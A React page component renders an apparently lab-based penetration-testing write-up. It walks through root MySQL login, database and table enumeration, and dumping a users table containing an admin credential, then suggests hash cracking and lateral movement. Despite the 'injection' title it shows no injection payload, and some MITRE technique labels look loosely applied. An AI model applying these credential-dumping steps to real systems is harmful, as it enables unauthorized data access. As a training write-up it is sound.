// src/pages/markdown/MySQLInjection.jsx
import React from 'react';
import './CommonStyles.css';

const MySQLInjection = () => {
  return (
    <div className="mysql-injection-content">
      <div className="ctf-header">
        <h1>Penetration Testing Workflow: MySQL Injection</h1>
        <p>Exploiting a MySQL injection vulnerability to extract sensitive data from a database.</p>
      </div>

      <div className="content-section">
        <h3>1. Initial Access to MySQL Database</h3>
        <p>
          After gaining access to the target system, we access the MySQL console with root privileges, providing direct access 
          to the database.
        </p>
        <h4>Login to MySQL</h4>
        <pre><code>mysql -u root</code></pre>
        <p><strong>TTP:</strong> Exploitation of SQL Injection (T1190) or credential discovery can provide a foothold into the system.</p>
      </div>

      <div className="content-section">
        <h3>2. Enumerating Databases</h3>
        <p>Once in the MySQL shell, we enumerate databases to locate sensitive information.</p>
        <h4>Command</h4>
        <pre><code>show databases;</code></pre>
        <h4>Output</h4>
        <pre><code>
+--------------------+<br />
|&nbsp;Database&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />
+--------------------+<br />
|&nbsp;information_schema&nbsp;&nbsp;|<br />
|&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />
|&nbsp;pentesterlab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />
|&nbsp;performance_schema&nbsp;&nbsp;|<br />
+--------------------+
        </code></pre>
        <p><strong>Finding:</strong> The <code>pentesterlab</code> database likely contains application data.</p>
        <p><strong>TTP:</strong> Database Enumeration (T1083) reveals potential data stores with sensitive information.</p>
      </div>

      <div className="content-section">
        <h3>3. Switching to the Target Database</h3>
        <p>Next, we switch to the <code>pentesterlab</code> database to continue the search for valuable data.</p>
        <h4>Command</h4>
        <pre><code>use pentesterlab;</code></pre>
      </div>

      <div className="content-section">
        <h3>4. Enumerating Tables in the Database</h3>
        <p>We list the tables in the <code>pentesterlab</code> database to identify where user data might be stored.</p>
        <h4>Command</h4>
        <pre><code>show tables;</code></pre>
        <h4>Output</h4>
        <pre><code>
+------------------------+<br />
|&nbsp;Tables_in_pentesterlab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />
+------------------------+<br />
|&nbsp;users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />
+------------------------+
        </code></pre>
        <p><strong>Finding:</strong> The <code>users</code> table is likely to contain usernames and passwords.</p>
        <p><strong>TTP:</strong> Table Enumeration (T1083) helps identify critical tables holding high-value data.</p>
      </div>

      <div className="content-section">
        <h3>5. Extracting User Credentials</h3>
        <p>We extract user data from the <code>users</code> table, which is expected to contain login credentials.</p>
        <h4>Command</h4>
        <pre><code>select * from users;</code></pre>
        <h4>Output</h4>
        <pre><code>
+-------+--------------------------------------+<br />
|&nbsp;login&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br />
+-------+--------------------------------------+<br />
|&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;0cefcff1-b087-4710-95ee-92218b028cdf&nbsp;&nbsp;|<br />
+-------+--------------------------------------+
        </code></pre>
        <p><strong>Finding:</strong> The extracted admin credentials may need further cracking or analysis.</p>
        <p><strong>TTP:</strong> Credential Dumping (T1003) allows attackers to obtain login information from the database.</p>
      </div>

      <div className="content-section">
        <h3>6. Post-Exploitation</h3>
        <p>The extracted admin credentials (<code>admin: 0cefcff1-b087-4710-95ee-92218b028cdf</code>) can be used for:</p>
        <ul>
          <li><strong>Password Cracking:</strong> Attempt to crack the password if it is hashed using tools like John the Ripper or hashcat.</li>
          <li><strong>Lateral Movement:</strong> Use the credentials to authenticate to other systems within the network.</li>
        </ul>
      </div>

      <div className="ctf-summary">
        <h3>Summary of Key TTPs</h3>
        <ul>
          <li><strong>T1190:</strong> Exploiting SQL Injection or other vulnerabilities to gain database access.</li>
          <li><strong>T1083:</strong> Database and Table Enumeration to locate sensitive information.</li>
          <li><strong>T1003:</strong> Credential Dumping to extract usernames and passwords.</li>
        </ul>
        <p>This workflow demonstrates how a MySQL injection vulnerability can provide unauthorized access to sensitive information, opening paths for privilege escalation or lateral movement within the network.</p>
      </div>
    </div>
  );
};

export default MySQLInjection;
